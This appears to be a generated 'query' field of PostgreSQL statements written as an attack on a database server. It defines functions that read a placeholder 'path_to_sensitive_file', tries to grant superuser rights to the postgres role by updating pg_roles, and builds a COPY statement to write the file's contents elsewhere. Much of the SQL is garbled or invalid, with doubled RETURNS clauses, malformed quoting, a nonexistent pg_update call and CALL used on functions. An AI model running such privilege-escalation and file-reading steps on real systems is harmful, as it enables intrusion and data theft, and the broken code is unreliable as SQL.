query:
  DROP FUNCTION IF EXISTS pg_read_file(text);
  CREATE OR REPLACE FUNCTION pg_read_file(p_path text)
  RETURNS text AS $$ DECLARE
  ret text;
  BEGIN
  ret := $1;
  RETURN ret;
  END;
$$ LANGUAGE plpgsql
  IMMUTABLE
  RETURNS text;

CREATE OR REPLACE FUNCTION psql_f() RETURNS TEXT AS $$
BEGIN
 RETURN pg_read_file('path_to_sensitive_file');
END;
$$ LANGUAGE plpgsql; CREATE OR REPLACE FUNCTION psql_f() AS 'SELECT psql_f()';

CREATE OR REPLACE FUNCTION alter_superuser() RETURNS VOID AS $$
BEGIN
 PERFORM pg_update('UPDATE pg_roles SET rolsuper = TRUE WHERE rolname = ''postgres'''); RETURN;
END;
$$ LANGUAGE plpgsql; CALL alter_superuser();

CREATE EXTENSION IF NOT EXISTS 'plv8'; CREATE OR REPLACE FUNCTION execute_query() RETURNS TABLE AS $$
BEGIN
 RETURN QUERY SELECT pg_read_file('path_to_sensitive_file');
END;
$$ LANGUAGE plv8; CALL execute_query();

CREATE EXTENSION IF NOT EXISTS 'plpgsql'; CREATE OR REPLACE FUNCTION psql_func_f() RETURNS TEXT AS $$
BEGIN
 RETURN pg_read_file('path_to_sensitive_file');
END;
$$ LANGUAGE plpgsql;

CREATE OR REPLACE FUNCTION copy_from_program() RETURNS TABLE AS $$
BEGIN
 EXECUTE 'COPY (SELECT pg_read_file(' || ''' || '' || pg_read_file('path_to_sensitive_file') || '' || ''' || ''')) TO ''path_to_copy_file'' WITH CSV HEADER;',
 RETURN QUERY SELECT * FROM ' || '''' || '''' || ''path_to_copy_file'' || '''' || '''';
END;
$$ LANGUAGE plpgsql;
